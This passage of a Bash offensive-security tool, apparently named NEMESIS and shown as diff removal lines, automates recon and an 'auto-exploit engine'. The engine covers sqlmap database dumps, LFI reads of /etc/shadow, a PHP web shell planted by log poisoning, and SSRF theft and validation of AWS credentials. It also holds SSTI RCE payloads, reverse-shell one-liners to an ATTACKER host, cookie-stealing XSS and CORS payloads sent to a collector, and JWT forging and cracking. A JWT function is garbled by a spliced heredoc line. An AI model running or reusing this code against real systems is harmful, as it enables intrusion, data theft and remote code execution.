-# ─────────────────────────── MOD 08 — AUTHZ (IDOR/BAC/OAuth/JWT) ───────────────────────────
-mod_authz() {
-  local O="$W/vulns" U="$W/urls"
-  if [[ "$M_IDOR" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "08a IDOR / BAC (extract → probe → qverify → queue)"
-    grep -oE 'https?://[^ ]+[?&][a-zA-Z0-9_]+=[0-9]+' "$U/all.txt" 2>/dev/null | sort -u > "$O/idor/num_urls_raw.txt"
-    grep -oP '[?&/][a-zA-Z0-9_-]*/?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' "$U/all.txt" 2>/dev/null | sort -u > "$O/idor/uuids.txt"
-    while IFS= read -r u; do [[ -n "$u" ]] && qverify "idor" "$u" "numeric-id" "medium"; done < <(head -50 "$O/idor/num_urls_raw.txt")
-    local PRIV="$W/classified/bac/priv.txt"
-    grep -iE "(/admin|/manage|/dashboard|/panel|/superuser|/staff|/internal|/back-?office|/cms|/api/v?[0-9]?/?(users?|accounts?|orders?|admin|roles?|permissions?))" \
-      "$W/endpoints/all.txt" "$U/all.txt" 2>/dev/null | sort -u > "$PRIV" || true
-    while IFS= read -r ep; do
-      probe "$ep"
-      case "$RC" in
-        200) soft404 "$ep" "$RB" || { echo "$ep" >> "$O/idor/bac_unauthed.txt"; qverify "bac" "$ep" "unauthenticated-200" "high"; } ;;
-        403) echo "$ep" >> "$O/idor/bac_403.txt" ;;
-      esac
-    done < "$PRIV" 2>/dev/null || true
-    while IFS= read -r u; do
-      for m in POST PUT DELETE PATCH; do
-        RC=$(curlx -X "$m" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
-        [[ "$RC" =~ ^(200|201|204)$ ]] && qverify "bac" "$u" "method-$m" "high"
-      done
-    done < <(head -40 "$PRIV" 2>/dev/null)
-    u "$O/idor/num_urls_raw.txt" "$O/idor/uuids.txt" "$O/idor/bac_403.txt" "$O/idor/bac_unauthed.txt"
-    log OK "IDOR verified: $(qcount idor) | BAC verified: $(qcount bac)"
-  fi
-  if [[ "$M_OAUTH" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "08b OAuth flow analysis"
-    local OO="$W/classified/oauth"
-    grep -iE "/(oauth|oauth2|oidc|openid|connect|sso|authorize|token|callback|userinfo|jwks|\.well-known/openid-configuration)(/|$|\?)" "$U/all.txt" 2>/dev/null | sort -u > "$OO/endpoints.txt"
-    grep -iE "[?&](client_id|client_secret|redirect_uri|response_type|grant_type|scope|state|nonce|code_challenge|code_verifier|code|access_token|refresh_token)=" "$U/all.txt" 2>/dev/null | sort -u > "$OO/params.txt"
-    grep -iE "[?&#](access_token|id_token|token|jwt|bearer)=[a-zA-Z0-9._-]{20,}" "$U/all.txt" 2>/dev/null | sort -u > "$OO/tokens_in_url.txt"
-    [[ -s "$OO/tokens_in_url.txt" ]] && log H "Tokens in URLs (unique): $(cnt "$OO/tokens_in_url.txt")"
-    grep -iE "[?&]redirect_uri=" "$U/all.txt" 2>/dev/null | head -30 | while IFS= read -r u; do
-      local t final; t=$(echo "$u" | sed 's/redirect_uri=[^&]*/redirect_uri=https:\/\/evil.com/')
-      probe -L "$t"
-      final=$(curlx -o /dev/null -w '%{url_effective}' -- "$t" 2>/dev/null || true)
-      echo "$final" | grep -q "evil.com" && qverify "oauth" "$t" "open-redirect_uri" "high"
-    done || true
-    grep -iE "/(authorize|auth)\?" "$U/all.txt" 2>/dev/null | while IFS= read -r u; do
-      echo "$u" | grep -qiE "[?&]state=" || echo "$u" >> "$OO/no_state.txt"
-      echo "$u" | grep -qiE "code_challenge" || echo "$u" >> "$OO/no_pkce.txt"
-    done || true
-    u "$OO/endpoints.txt" "$OO/params.txt" "$OO/tokens_in_url.txt" "$OO/no_state.txt" "$OO/no_pkce.txt"
-    log OK "OAuth endpoints (unique): $(cnt "$OO/endpoints.txt") | verified: $(qcount oauth)"
-  fi
-  if [[ -s "$W/js/jwts.txt" && ("$M_OAUTH" == true || "$M_VULN" == true || "$G_FULL" == true) ]]; then
-    step "08c JWT analysis (alg:none → queue)"
-    while IFS= read -r jwt; do
-      local hdr; hdr=$(echo "$jwt" | cut -d. -f1 | base64 -d 2>/dev/null || true)
-      echo "$hdr" | grep -qi '"alg"[[:space:]]*:[[:space:]]*"none"' && qverify "jwt" "$jwt" "alg-none" "critical"
-    done < "$W/js/jwts.txt"
-    log OK "JWT verified: $(qcount jwt)"
-  fi
-}
-
-# ─────────────────────────── MOD 09 — CLOUD / EXPOSURE / TECH ───────────────────────────
-mod_cloud() {
-  step "09 EXPOSURE · BUCKETS · TECH CHECKS"
-  local O="$W/vulns/misconfig" LIVE="$W/subs/live.txt"
-  while IFS= read -r base; do
-    for p in "${META_FILES[@]}"; do
-      probe "${base}${p}"
-      if [[ "$RC" == "200" && "$RL" -gt 10 ]]; then
-        soft404 "${base}${p}" "$RB" && continue
-        echo "EXPOSED|${base}${p}|${RL}b" >> "$O/sensitive.txt"
-        log H "Exposed (verified): ${base}${p} (${RL}b)"
-        [[ "$p" == */.git/* ]] && curlx -- "${base}/.git/config" | head -5 >> "$O/git_config.txt" 2>/dev/null || true
-      fi
-    done
-  done < <(head -12 "$LIVE" 2>/dev/null)
-  u "$O/sensitive.txt" "$O/git_config.txt"
-  log I "bucket enumeration (s3/gcs)…"
-  for n in "$DOMAIN" "${DOMAIN//./-}" "backup.$DOMAIN" "uploads.$DOMAIN" "assets.$DOMAIN"; do
-    probe "https://$n.s3.amazonaws.com/?list-type=2&max-keys=3"
-    echo "$RB" | grep -q "ListBucketResult" && { echo "S3_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public S3 bucket (verified): $n"; }
-    probe "https://storage.googleapis.com/$n?prefix="
-    echo "$RB" | grep -q "ListBucketResult" && { echo "GCS_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public GCS bucket (verified): $n"; }
-  done
-  u "$O/buckets.txt"
-  local TECH="$W/subs/tech.txt"
-  grep -qi "wordpress" "$TECH" 2>/dev/null && {
-    head -3 "$LIVE" | while IFS= read -r b; do
-      local ue; ue=$(curlx -- "${b}/wp-json/wp/v2/users" 2>/dev/null)
-      echo "$ue" | grep -q '"id"' && { echo "WP_USER_ENUM|$b" >> "$O/tech_findings.txt"; log H "WP user enum (verified): $b"; }
-    done; }
-  for entry in "${TECH_PATHS[@]}"; do
-    local tech path; tech="${entry%%|*}"; path="${entry#*|}"
-    grep -qi "$tech" "$TECH" 2>/dev/null || continue
-    head -3 "$LIVE" | while IFS= read -r b; do
-      probe "${b}${path}"
-      [[ "$RC" == "200" ]] && { soft404 "${b}${path}" "$RB" || { echo "TECH_EXPOSED|${tech}|${b}${path}" >> "$O/tech_findings.txt"; log H "${tech} exposed: ${b}${path}"; }; }
-    done
-  done
-  u "$O/tech_findings.txt"
-  log OK "Sensitive (verified, unique): $(cnt "$O/sensitive.txt") | buckets: $(cnt "$O/buckets.txt")"
-}
-
-# ─────────────────────────── MOD 10 — API SCHEMA ───────────────────────────
-mod_api() {
-  [[ "$M_API" == false && "$G_FULL" == false ]] && return
-  step "10 API SCHEMA — OpenAPI · GraphQL · undocumented"
-  local O="$W/api" LIVE="$W/subs/live.txt"; mkdir -p "$O"
-  while IFS= read -r base; do
-    for p in "${API_PATHS[@]}"; do
-      probe "${base}${p}"
-      [[ "$RC" == "200" ]] && echo "$RB" | grep -qiE "(swagger|openapi|\"paths\"|\"info\")" && {
-        echo "${base}${p}" >> "$O/openapi_specs.txt"; log H "API spec (verified): ${base}${p}"; }
-    done
-  done < <(head -8 "$LIVE" 2>/dev/null)
-  while IFS= read -r base; do
-    for p in "${GQL_PATHS[@]}"; do
-      local g; g=$(curlx -X POST -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -- "${base}${p}" 2>/dev/null | head -c 2000 || true)
-      if echo "$g" | grep -qiE '(__typename|"errors")'; then
-        echo "${base}${p}" >> "$O/graphql_endpoints.txt"; log H "GraphQL endpoint (verified): ${base}${p}"
-        local gi; gi=$(curlx -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' -- "${base}${p}" 2>/dev/null | head -c 2000 || true)
-        echo "$gi" | grep -q "__schema" && { echo "${base}${p}" >> "$O/graphql_introspection.txt"; log H "GraphQL introspection OPEN (verified): ${base}${p}"; }
-      fi
-    done
-  done < <(head -8 "$LIVE" 2>/dev/null)
-  log I "undocumented API version fuzz…"
-  for base in /api /api/v1 /api/v2 /api/v3 /rest /backend; do
-    probe "https://$DOMAIN${base}"
-    [[ "$RC" =~ ^(200|201|401|403)$ ]] && { soft404 "https://$DOMAIN${base}" "$RB" || echo "API_BASE [${RC}]: ${base}" >> "$O/api_bases.txt"; }
-  done
-  u "$O/openapi_specs.txt" "$O/graphql_endpoints.txt" "$O/graphql_introspection.txt" "$O/api_bases.txt"
-  log OK "Specs: $(cnt "$O/openapi_specs.txt") | GraphQL: $(cnt "$O/graphql_endpoints.txt") | introspection open: $(cnt "$O/graphql_introspection.txt")"
-}
-
-# ─────────────────────────── MOD 11 — PARAM FUZZ ───────────────────────────
-mod_param_fuzz() {
-  [[ "$M_PMF" == false && "$G_FULL" == false ]] && return
-  step "11 PARAM FUZZ — hidden params · type confusion · JSON mutation"
-  local O="$W/vulns/param_fuzz"; mkdir -p "$O"
-  local PW="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
-  [[ ! -f "$PW" ]] && PW="/usr/share/wordlists/dirb/common.txt"
-  has ffuf && {
-    head -30 "$W/subs/status_200.txt" 2>/dev/null | while IFS= read -r u; do
-      local base_url="${u%%\?*}" s; s=$(sn "$u")
-      ffuf -u "${base_url}?FUZZ=nemesis_probe" -w "$PW" -t 50 -mc 200,201,302 -fs 0 \
-        -of json -o "$O/ffuf_get_${s}.json" -s 2>/dev/null || true
-    done
-    find "$O" -name 'ffuf_get_*.json' -size +10c | xargs -I{} jq -r '.results[]?.input.FUZZ' {} 2>/dev/null | sort -u > "$O/hidden_params.txt" || true
-    u "$O/hidden_params.txt"; }
-  local TM=("0" "-1" "999999999" "null" "undefined" "true" "false" "[]" "{}" "NaN" "Infinity" "%00" "'OR 1=1--" "<script>" "{{7*7}}" "../etc/passwd")
-  while IFS= read -r u; do
-    for m in "${TM[@]}"; do
-      local t; t=$(echo "$u" | qsreplace "$m" 2>/dev/null)
-      probe "$t"
-      if [[ "$RC" == "500" ]] || echo "$RB" | grep -qiE "(stack trace|typeerror|valueerror|null pointer|parse error|invalid.*type|expected.*number)"; then
-        echo "TYPE_CONFUSION [${RC}] (${m}): $t" >> "$O/type_confusion.txt"
-      fi
-    done
-  done < <(head -40 "$W/urls/params.txt" 2>/dev/null)
-  u "$O/type_confusion.txt"
-  local JP=('{"__proto__":{"admin":true}}' '{"$gt":"","$ne":""}' '{"role":"admin","is_admin":true,"privilege":9999}' '{"a":"b","c":"d","e":"f","g":"h","i":"j","k":"l","m":"n","o":"p","q":"r","s":"t","u":"v","w":"x","y":"z"}')
-  local JL=("prototype_pollution" "nosqli" "mass_assign" "large_payload")
-  while IFS= read -r u; do
-    for i in "${!JP[@]}"; do
-      local b c; b=$(curlx -X POST -H "Content-Type: application/json" -d "${JP[$i]}" -- "$u" 2>/dev/null | head -c 2000 || true)
-      c=$(curlx -X POST -H "Content-Type: application/json" -d "${JP[$i]}" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
-      if [[ "$c" =~ ^(200|201)$ ]] || echo "$b" | grep -qiE "(admin|success|token|privilege|elevated)"; then
-        echo "JSON_MUTATION [${JL[$i]}] [${c}]: $u" >> "$O/json_hits.txt"; log H "JSON mutation (verified): ${JL[$i]} @ $u"
-      fi
-    done
-  done < <(head -30 "$W/urls/params.txt" 2>/dev/null)
-  u "$O/json_hits.txt"
-  log OK "Hidden params: $(cnt "$O/hidden_params.txt") | type confusion: $(cnt "$O/type_confusion.txt") | JSON hits: $(cnt "$O/json_hits.txt")"
-}
-
-# ─────────────────────────── MOD 12 — SCREENSHOTS ───────────────────────────
-mod_screenshots() {
-  has gowitness || return
-  step "12 Screenshots (gowitness)"
-  gowitness scan file -f "$W/subs/live.txt" --screenshot-path "$W/screenshots" --threads 10 --timeout 15 --db-path "$W/screenshots/gowitness.sqlite3" 2>/dev/null || true
-  log OK "Screenshots → $W/screenshots/"
-}
-
-# ─────────────────────────── AUTO-EXPLOIT ENGINE ───────────────────────────
-exp_sqli() { local url=$1 out="$EX/sqli/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT SQLi → dump: $url"
-  local args=(--batch --random-agent --threads=5 --timeout=15 --retries=1 --tamper=space2comment,randomcase
-              --no-cast --smart --ignore-code=403 --answers="follow=N,reduce=Y,normalize=Y,proceed=C,test=Y,integer=Y"
-              --output-dir="$out")
-  [[ "$EXP_DUMP" == true ]] && args+=(--dump) || args+=(--banner --current-user --dbs)
-  timeout "$EXP_SQLI_T" sqlmap -u "$url" "${args[@]}" ${COOKIE:+--cookie="$COOKIE"} ${PROXY:+--proxy="$PROXY"} >/dev/null 2>&1 || true
-  find "$out" -name '*.csv' -size +0c | while IFS= read -r f; do
-    grep -v '^Target' "$f" | grep -v '^$' >> "$EX/sqli/dumps.txt" || true
-  done
-  u "$EX/sqli/dumps.txt"
-  log H "SQLi artifacts → $out (rows: $(cnt "$EX/sqli/dumps.txt"))"
-}
-exp_lfi() { local url=$1 out="$EX/lfi/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT LFI → file read + log-poison RCE: $url"
-  local base; base=$(echo "$url" | grep -oP 'https?://[^/]+')
-  local FILES=(/etc/passwd /etc/hostname /proc/self/environ /proc/self/cmdline /etc/shadow /etc/nginx/nginx.conf /var/www/html/index.php)
-  for f in "${FILES[@]}"; do
-    local t; t=$(echo "$url" | qsreplace "../../../../..$f" 2>/dev/null)
-    local b; b=$(curlx -- "$t" 2>/dev/null || true)
-    echo "=== $f ===" >> "$out/reads.txt"; echo "$b" | head -c 1500 >> "$out/reads.txt"; echo >> "$out/reads.txt"
-  done
-  local t2; t2=$(echo "$url" | qsreplace "php://filter/convert.base64-encode/resource=/etc/passwd" 2>/dev/null)
-  local b64; b64=$(curlx -- "$t2" 2>/dev/null | head -c 2000 || true)
-  echo "$b64" | base64 -d 2>/dev/null | grep -qE "root:x:" && { echo "BASE64_READ_OK|$t2" >> "$out/reads.txt"; log H "LFI base64 read confirmed"; }
-  local shell='<?php system($_GET["c"]); ?>'
-  [[ -n "$base" ]] && curlx -A "$shell" -- "${base}/__nemesis_log_poison" -o /dev/null 2>/dev/null || true
-  for lf in /var/log/nginx/access.log /var/log/apache2/access.log /var/log/apache2/error.log /proc/self/environ; do
-    local t3; t3=$(echo "$url" | qsreplace "$lf" 2>/dev/null)
-    local r; r=$(curlx -- "${t3}&c=id" 2>/dev/null || true)
-    if echo "$r" | grep -qE "uid=[0-9]+"; then
-      echo "RCE_LOG_POISON|${t3}&c=id|$r" >> "$out/rce.txt"
-      log H "RCE via log poisoning: ${t3}&c=id"
-      break
-    fi
-  done
-  u "$out/reads.txt" "$out/rce.txt"
-}
-exp_ssrf() { local url=$1 out="$EX/ssrf/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT SSRF → metadata harvest: $url"
-  for ep in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-            "http://metadata.google.internal/computeMetadata/v1/?recursive=true" "http://100.100.100.200/latest/meta-data/"; do
-    local t; t=$(echo "$url" | qsreplace "$ep" 2>/dev/null)
-    local b; b=$(curlx -L -- "$t" 2>/dev/null | head -c 3000 || true)
-    echo "=== $ep ===" >> "$out/metadata.txt"; echo "$b" >> "$out/metadata.txt"
-  done
-  local role; role=$(curlx -L -- "$(echo "$url" | qsreplace 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null)" 2>/dev/null | head -1 | tr -d '\r\n' || true)
-  if [[ -n "$role" && "$role" != *"<"* ]]; then
-    local creds; creds=$(curlx -L -- "$(echo "$url" | qsreplace "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" 2>/dev/null)" 2>/dev/null || true)
-    echo "$creds" > "$out/aws_creds_$role.json"
-    log H "AWS role '$role' credentials → $out/aws_creds_$role.json"
-    if [[ "$F_VERIFY_KEYS" == true && -n "$(command -v aws)" ]]; then
-      local ak sk; ak=$(echo "$creds" | jq -r .AccessKeyId 2>/dev/null); sk=$(echo "$creds" | jq -r .SecretAccessKey 2>/dev/null)
-      AWS_ACCESS_KEY_ID="$ak" AWS_SECRET_ACCESS_KEY="$sk" AWS_DEFAULT_REGION=us-east-1 \
-        aws sts get-caller-identity 2>/dev/null > "$out/validated_identity.json" && log H "VALIDATED AWS identity → $out/validated_identity.json"
-    fi
-  fi
-  u "$out/metadata.txt"
-}
-exp_cmdi() { local url=$1 out="$EX/cmdi/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT CMDi → command echo-back: $url"
-  local -a WRAPS=(";%s" "|%s" '`%s`' '$(%s)' "&&%s")
-  for cmd in "id" "whoami" "uname -a" "cat /etc/hostname"; do
-    for wrap in "${WRAPS[@]}"; do
-      local payload; payload=$(printf "$wrap" "$cmd")
-      local t; t=$(echo "$url" | qsreplace "$payload" 2>/dev/null)
-      local b; b=$(curlx -- "$t" 2>/dev/null || true)
-      if echo "$b" | grep -qE "(uid=[0-9]+|^[a-z_]+$|Linux [a-z0-9])"; then
-        echo "CMD_OK|$t|$(echo "$b" | head -c 300)" >> "$out/confirmed.txt"
-        log H "Command execution: $cmd → $(echo "$b" | head -c 120 | tr '\n' ' ')"
-        break 2
-      fi
-    done
-  done
-  u "$out/confirmed.txt"
-  [[ "$F_SHELL" == true ]] && cat > "$out/shell_options.txt" <<'SHL'
-# Reverse shells (manual use, in-scope only):
-# bash:    bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
-# nc:      nc -e /bin/sh ATTACKER PORT
-# python:  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-# php:     php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
-SHL
-}
-exp_ssti() { local url=$1 eng=$2 out="$EX/ssti/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT SSTI ($eng) → RCE probe: $url"
-  local payload=""
-  case "$eng" in
-    Jinja2) payload='{{cycler.__init__.__globals__.os.popen("id").read()}}' ;;
-    Twig) payload='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}' ;;
-    Freemarker) payload='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' ;;
-    Velocity) payload='#set($e="x")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")' ;;
-    ERB) payload='<%= system("id") %>' ;;
-    *) payload='{{7*7}}' ;;
-  esac
-  local t; t=$(echo "$url" | qsreplace "$payload" 2>/dev/null)
-  local b; b=$(curlx -- "$t" 2>/dev/null || true)
-  if echo "$b" | grep -qE "uid=[0-9]+"; then
-    echo "SSTI_RCE|$t|$b" >> "$out/rce.txt"; log H "SSTI → RCE: $t"
-  else echo "SSTI_CONFIRMED_NO_RCE|$t" >> "$out/notes.txt"; fi
-  u "$out/rce.txt" "$out/notes.txt"
-}
-exp_xss() { local url=$1 payload=$2 out="$EX/xss/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT XSS → PoC artifact: $url"
-  cat > "$out/poc.html" <<POCH
-<!DOCTYPE html><html><head><title>XSS PoC</title></head><body>
-<h2>Reflected XSS — VERIFIED</h2>
-<p>Target: <a href="$url">$url</a></p>
-<p>Payload: <code>$(echo "$payload" | sed 's/&/\&amp;/g;s/</\&lt;/g')</code></p>
-<p>Cookie-steal (place in param):</p>
-<code><script>fetch('${COLLECTOR:-https://COLLECTOR.EXAMPLE/x}?c='+document.cookie)</script></code>
-</body></html>
-POCH
-  log H "XSS PoC → $out/poc.html"
-}
-exp_idor() { local url=$1 out="$EX/idor/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT IDOR → neighbor sweep: $url"
-  local ids pname pval; ids=$(echo "$url" | grep -oE '[?&][a-zA-Z0-9_]+=[0-9]+' | head -1)
-  [[ -z "$ids" ]] && return
-  pname="${ids%%=*}"; pname="${pname#*[?&]}"; pval="${ids##*=}"
-  for n in 1 2 3 "$((pval+1))" "$((pval-1))" "$((pval+100))"; do
-    local t; t=$(echo "$url" | sed "s/${pname}=${pval}/${pname}=${n}/")
-    local b; b=$(curlx -- "$t" 2>/dev/null | head -c 1500 || true)
-    echo "=== id=${n} ===" >> "$out/sweep.txt"; echo "$b" >> "$out/sweep.txt"
-    echo "$b" | grep -qiE "email|ssn|password|token|address|phone" && {
-      echo "DIFF|$t" >> "$out/cross_user_candidates.txt"; log H "Cross-user data signal: $t"; }
-  done
-  cat > "$out/README.txt" <<RDE
-IDOR verification (2 accounts):
-1. Burp → Autorize → low-priv cookie → replay $url with other IDs
-2. Diff $out/sweep.txt for cross-account data
-RDE
-  u "$out/sweep.txt" "$out/cross_user_candidates.txt"
-}
-exp_bac() { local url=$1 out="$EX/bac/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT BAC → role-injection + method switch: $url"
-  local -a P=("role=admin" "is_admin=true" "isAdmin=true" "user_type=admin" "privilege=9999" "level=1" "scope=admin")
-  for p in "${P[@]}"; do
-    local t; t=$(setparam "$url" "${p%%=*}" "${p#*=}")
-    local b; b=$(curlx -X POST -d "$p" -- "$t" 2>/dev/null | head -c 800 || true)
-    echo "$b" | grep -qiE "(admin|success|granted|true)" && {
-      echo "ROLE_HIT|$p|$t" >> "$out/role_inject.txt"; log H "Role injection signal: $p @ $t"; }
-  done
-  for m in POST PUT PATCH DELETE OPTIONS; do
-    local c; c=$(curlx -X "$m" -o /dev/null -w '%{http_code}' -- "$url" 2>/dev/null || echo 000)
-    [[ "$c" =~ ^(200|201|204)$ ]] && { echo "METHOD_OK|$m|$url" >> "$out/method.txt"; log H "Method bypass $m → $c: $url"; }
-  done
-  u "$out/role_inject.txt" "$out/method.txt"
-}
-exp_jwt() { local jwt=$1 out="$EX/jwt/$(sn "$jwt")"; mkdir -p "$out"
-  log H "EXPLOIT JWT → crack + forge: ${jwt:0:40}…"
-  echo "$jwt" > "$out/token.txt"
-  local hdr; hdr=$(echo "$jwt" | cut -d. -f1 | base64 -d 2>/dev/null || true)
-  if echo "$hdr" | grep -qi '"alg"[^,]*"none"'; then
-    local p h2; p=$(echo "$jwt" | cut -d. -f2)
-    h2=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
-    echo "${h2}.${p}." > "$out/alg_none_forged.txt"
-    log H "alg:none forged → $out/alg_none_forged.txt"
-  fi
-  [[ -f "$HOME/tools/jwt_tool/jwt_tool.py" ]] && \
-    python3 "$HOME/tools/jwt_tool/jwt_tool.py" "$jwt" -C -d /usr/share/seclists/Passwords/rockyou.txt 2>/dev/null > "$out/crack.txt" || true
-  grep -qiE "KEY FOUND|secret" "$out/crack.txt" 2>/dev/null && log H "JWT
-  cat >> /usr/local/bin/bug <<'NEMESIS_EOF'
-grep -qiE "KEY FOUND|secret" "$out/crack.txt" 2>/dev/null && log H "JWT cracked → $out/crack.txt"
-  u "$out/crack.txt" "$out/alg_none_forged.txt"
-}
-
-# ─────────────────────────── AUTO-EXPLOIT ENGINE (cont.) ───────────────────────────
-exp_takeover() { local host=$1 out="$EX/takeover/$(sn "$host")"; mkdir -p "$out"
-  log H "EXPLOIT subdomain takeover → claimability: $host"
-  local b; b=$(curlx -- "http://$host" -o /dev/null 2>/dev/null || true)
-  probe "http://$host"
-  for sig in "There isn't a GitHub Pages site here" "NoSuchBucket" "NoSuchWebsiteConfiguration" \
-             "NXDOMAIN" "The specified bucket does not exist" "No such app" "This page is not live" \
-             "The page you are looking for is not found" "project not found" "No site found" \
-             "Domain is not configured" "No such project" "is not a registered namespace"; do
-    echo "$RB" | grep -qi "$sig" && {
-      echo "CLAIMABLE|$host|$sig" >> "$out/claimable.txt"
-      log H "TAKEOVER CLAIMABLE: $host (${sig:0:50})"
-      break; }
-  done
-  u "$out/claimable.txt"
-}
-exp_csrf() { local url=$1 out="$EX/csrf/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT CSRF → PoC form: $url"
-  local origin; origin=$(echo "$url" | grep -oP 'https?://[^/]+')
-  cat > "$out/poc.html" <<POCF
-<!DOCTYPE html><html><body>
-<form action="$url" method="POST" id="f">
-  <input name="email" value="attacker@evil.com"><input name="role" value="admin">
-</form><script>document.getElementById('f').submit();</script>
-</body></html>
-POCF
-  # origin-header sanity check (CSRF protection evidence)
-  local chk; chk=$(curlx -X POST -H "Origin: https://evil.example" -d "x=1" -o /dev/null -w '%{http_code}' -- "$url" 2>/dev/null || echo 000)
-  [[ "$chk" =~ ^(200|201|204|302)$ ]] && echo "NO_ORIGIN_CHECK|$url|${chk}" >> "$out/no_origin_check.txt"
-  u "$out/no_origin_check.txt"; log H "CSRF PoC → $out/poc.html"
-}
-exp_cors() { local url=$1 out="$EX/cors/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT CORS → origin reflection: $url"
-  local o; o=$(echo "$url" | grep -oP 'https?://[^/]+')
-  local b; b=$(curlx -H "Origin: https://evil.example" -D - -o /dev/null -- "$url" 2>/dev/null || true)
-  if echo "$b" | grep -qi "Access-Control-Allow-Origin: https://evil.example"; then
-    echo "REFLECTED|$url" >> "$out/reflected.txt"
-    echo "$b" | grep -i "Access-Control-Allow-Credentials" | grep -qi true && echo "WITH_CREDENTIALS|$url" >> "$out/reflected.txt"
-    cat > "$out/poc.html" <<POCR
-<!DOCTYPE html><html><body><script>
-fetch('$url',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='${COLLECTOR:-https://COLLECTOR.EXAMPLE/x}?d='+btoa(d));
-</script></body></html>
-POCR
-    log H "CORS reflection verified → $out/poc.html"
-  fi
-  u "$out/reflected.txt"
-}
-exp_redirect() { local url=$1 out="$EX/redirect/$(sn "$url")"; mkdir -p "$out"
-  log H "EXPLOIT open redirect → PoC: $url"
-  local t; t=$(echo "$url" | qsreplace "https://evil.example" 2>/dev/null)
-  local loc; loc=$(curlx -s -o /dev/null -w '%{redirect_url}' -- "$t" 2>/dev/null || true)
-  if [[ "$loc" == https://evil.example* ]]; then
-    echo "OPEN_REDIRECT|$url|$loc" >> "$out/confirmed.txt"
-    cat > "$out/poc.html" <<POCR
-<a href="$t">Click — redirects to evil.example (phishing)</a>
-POCR
-    log H "Open redirect verified → $out/poc.html"
-  fi
-  u "$out/confirmed.txt"
-}
-
-# ─────────────────────────── EXPLOIT ORCHESTRATOR ───────────────────────────
-run_exploits() {
-  step "EXPLOIT — auto chain: verify → dedupe → weaponize"
-  [[ "$F_NO_EXPLOIT" == true ]] && { log W "skipping auto-exploit (--no-exploit)"; return; }
-  mkdir -p "$EX"
-  local i=0 total=${#EXPLOITS[@]}
-  for row in "${EXPLOITS[@]+"${EXPLOITS[@]}"}"; do
-    i=$((i+1)); IFS=$'\t' read -r sev kind data <<< "$row"
-    log S "Exploit $i/$total — [$sev] $kind"
-    case "$kind" in
-      sqli)     exp_sqli "$data" ;;
-      lfi)      exp_lfi "$data" ;;
-      ssrf)     exp_ssrf "$data" ;;
-      cmdi)     exp_cmdi "$data" ;;
-      ssti)     local eng; eng=$(echo "$data" | cut -d'|' -f1)
-                exp_ssti "$(echo "$data" | cut -d'|' -f2-)" "$eng" ;;
-      xss)      local pl; pl=$(echo "$data" | cut -d'|' -f1)
-                exp_xss "$(echo "$data" | cut -d'|' -f2-)" "$pl" ;;
-      idor)     exp_idor "$data" ;;
-      bac)      exp_bac "$data" ;;
-      jwt)      exp_jwt "$data" ;;
-      takeover) exp_takeover "$data" ;;
-      csrf)     exp_csrf "$data" ;;
-      cors)     exp_cors "$data" ;;
-      redirect) exp_redirect "$data" ;;
-    esac
-    EXPLOIT_COUNT=$((EXPLOIT_COUNT+1))
-  done
-  log OK "Auto-exploit queue drained ($EXPLOIT_COUNT rounds). Artifacts → $EX/"
-}
-
-# ─────────────────────────── REPORTING ───────────────────────────
-findings_snapshot() { local f
-  for f in "$W"/vulns/*.txt "$W"/api/*.txt; do [[ -f "$f" ]] && cat "$f"; done | sort -u; }
-
-gen_md_report() {
-  local RPT="$W/reports/report.md"
-  { echo "# NEMESIS v$VERSION — $DOMAIN"
-    echo
-    echo "Generated: $(date '+%F %T') | Elapsed: $(( ($(date +%s)-START)/60 ))m"
-    echo
-    echo "## Verified Findings (CRITICAL/HIGH)"
-    echo '```'
-    findings_snapshot | grep -E "CRITICAL|HIGH" || echo "(none)"
-    echo '```'
-    echo "## Exploit Artifacts"
-    echo '```'
-    find "$EX" -type f 2>/dev/null | sed "s|$W/||" | sort
-    echo '```'
-    echo "## Medium (review)"
-    echo '```'
-    cat "$W/reports/review_medium.txt" 2>/dev/null || echo "(none)"
-    echo '```'
-    echo "## Counters"
-    local s; s=$(find "$W/vulns" -name '*.txt' -exec cat {} + 2>/dev/null | wc -l | tr -d ' ')
-    echo "- unique verified findings: $s"
-    echo "- exploit rounds: $EXPLOIT_COUNT"
-    echo "- hosts: $(cnt "$W/subs/live.txt" 2>/dev/null)"
-    echo "- URLs: $(cnt "$W/urls/all.txt" 2>/dev/null)"
-    echo "- JS paths: $(cnt "$W/js/paths/all.txt" 2>/dev/null)"
-  } > "$RPT"
-  log OK "report → $RPT"
-}
-gen_html_report() {
